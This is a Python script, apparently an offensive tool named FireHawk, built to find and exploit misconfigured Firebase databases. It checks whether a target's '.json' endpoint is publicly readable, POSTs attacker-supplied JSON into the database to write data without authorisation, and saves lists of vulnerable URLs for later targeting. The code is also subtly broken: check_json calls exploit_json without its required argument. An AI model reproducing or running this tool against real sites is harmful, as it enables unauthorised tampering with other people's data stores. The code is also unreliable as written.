import argparse
import json
import requests

class JohnHammond:
    def __init__(self, url, path="firebaseExploiter"):
        self.url = url
        self.path = path
        self.vulnerable_urls = []

    def check_json(self):
        starts_with_https = self.url.startswith("https://")
        if not starts_with_https:
            self.url = "https://" + self.url
        ends_with_slash = self.url.endswith("/")
        if not ends_with_slash:
            self.url += "/"
        try:
            response = requests.get(self.url + ".json")
            if response.status_code == 200:
                print("\033[91m[+] Firebase Possibly Vulnerable\033[0m")
                self.vulnerable_urls.append(self.url)
                self.exploit_json()
            elif response.status_code != 200:
                print("\033[93m[*] Firebase Not Vulnerable\033[0m")
        except Exception as e:
            print("\033[93m[-] Failed to connect {}\033[0m".format(self.url))

    def is_json(self, s):
        try:
            json.loads(s)
            return True
        except ValueError:
            return False

    def exploit_json(self, json_file):
        try:
            with open(json_file, "r") as file:
                data = file.read()
                if not self.is_json(data):
                    print("\033[93m[-] File '{}' is not in proper JSON format\033[0m".format(json_file))
                    return
                response = requests.post(self.url + self.path + ".json", data=data)
                if response.status_code == 200:
                    print("\033[92m[+] Exploited URL - {}\033[0m".format(self.url + self.path + ".json"))
                else:
                    print("\033[93m[*] Exploit Failed For - {}\033[0m".format(self.url + self.path + ".json"))
        except FileNotFoundError:
            print("\033[93m[-] File '{}' does not exist\033[0m".format(json_file))
        except Exception as e:
            print("\033[93m[-] Failed to exploit {}\033[0m".format(self.url + self.path + ".json"))

    def save_vulnerable_urls(self, output_file):
        try:
            with open(output_file, "w") as file:
                for url in self.vulnerable_urls:
                    file.write(url + "\n")
            print("\033[92m[+] Vulnerable Firebase URLs saved to '{}'\033[0m".format(output_file))
        except Exception as e:
            print("\033[93m[-] Failed to save vulnerable URLs to '{}'\033[0m".format(output_file))

def smile_hacker():
    print("\033[91m")
    print(r"""
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⠀⣀⣀⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⡰⠒⠈⠀⠀⠀⠀⠀⠀⠀⠑⢄⡀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⢀⠰⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢁⡌⠄⢀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠋⠀⠀⠀⠀⢀⣀⣀⣤⣤⡤⣤⣶⢷⡿⢃⡤⠆⠊⠀⠢⡀⠀
⠀⠀⠀⠀⠃⠀⠀⠀⠀⠀⠀⠀⠺⠿⣤⣅⣿⣿⠟⠁⠀⠀⠀⠀⠀⠀⠈⡄
⠀⠀⠀⠇⠀⠠⠀⢀⡔⠀⠀⢀⠀⠈⠟⣛⣻⣣⣤⣬⠭⠀⠤⠤⠤⢆⠀⠀
⠀⠀⡜⡠⢂⢀⡴⠋⠀⠠⠊⠉⢀⣀⣤⣾⣿⣿⡟⠋⠀⠀⠀⠀⠀⢠⠔⠁
⠀⢠⣿⣧⣿⠟⢀⠄⡀⠀⠀⢀⣾⣿⣿⣿⣿⢛⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⣽⣿⣿⣿⡶⣥⠞⡰⣀⣰⣿⣿⣿⣿⣿⣿⠀⢖⠀⠀⠀⠀⠀⠀⠀⠀⠀
⢀⣿⣿⣿⣯⣼⣿⣿⣿⣿⣿⠟⣿⣿⣿⣿⡏⠀⣨⣧⠀⠀⠀⠀⠀⠀⠀⠀
⠀⡿⣿⣿⣿⣿⣿⣿⣿⣵⣣⣼⣿⣿⣿⣿⣿⣦⣿⠃⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠉⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⡄⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⢹⣿⣿⣿⡿⢿⣿⣿⣿⡿⢻⠟⢿⣿⠛⠓⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠈⠙⠋⠋⠀⢿⣿⡟⠁⠀⠈⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠈⠁⠁
[FireHawk🔥 v1.0 By Iamunixtz]
""")
    print("\033[0m")

def kevin_mitnick():
    parser = argparse.ArgumentParser(description="FirebaseExploiter - A tool to exploit insecure Firebase databases")
    parser.add_argument("-u", "--url", help="Target URL")
    parser.add_argument("-j", "--json", help="Custom JSON file for exploitation")
    parser.add_argument("-l", "--list", action="store_true", help="List of Firebase database URLs from a file")
    parser.add_argument("-o", "--output", help="Save vulnerable Firebase URLs to a file")
    args = parser.parse_args()

    if args.list:
        try:
            with open("firebase_databases.txt", "r") as file:
                databases = file.readlines()
                print("\033[93m[+] Firebase Databases\033[0m")
                for db in databases:
                    print(db.strip())
        except FileNotFoundError:
            print("\033[93m[-] File 'firebase_databases.txt' does not exist\033[0m")
        return

    if not args.url:
        parser.print_help()
        return

    exploiter = JohnHammond(args.url)
    if args.json:
        exploiter.exploit_json(args.json)
    else:
        exploiter.check_json()

    if args.output:
        exploiter.save_vulnerable_urls(args.output)

if __name__ == "__main__":
    smile_hacker()
    kevin_mitnick()

